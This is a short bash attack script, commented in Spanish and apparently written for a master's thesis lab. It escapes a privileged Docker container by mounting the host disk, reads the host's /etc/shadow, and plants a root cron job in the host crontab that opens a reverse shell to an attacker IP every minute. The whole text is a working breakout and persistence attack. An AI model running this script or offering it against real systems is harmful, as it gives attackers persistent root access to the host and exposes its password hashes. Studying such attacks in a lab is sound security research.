#!/bin/bash
# TFM - Fase 1: Docker Breakout & Persistence
# Descripción: Escape de contenedor privilegiado y creación de tarea Cron maliciosa.

# 1. Crear punto de montaje
mkdir /tmp/docker_escape

# 2. Montar el disco físico del host (sda1)
# Nota: Aprovecha la flag --privileged del contenedor
mount /dev/sda1 /tmp/docker_escape

# 3. Verificación de acceso (Lectura de shadow)
ls -la /tmp/docker_escape/etc/shadow

# 4. Inyección de Persistencia (Reverse Shell cada minuto)
# IP Atacante: 192.168.10.133
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/192.168.10.133/5555 0>&1'" >> /tmp/docker_escape/etc/crontab

echo "[+] Persistencia establecida en el Host."
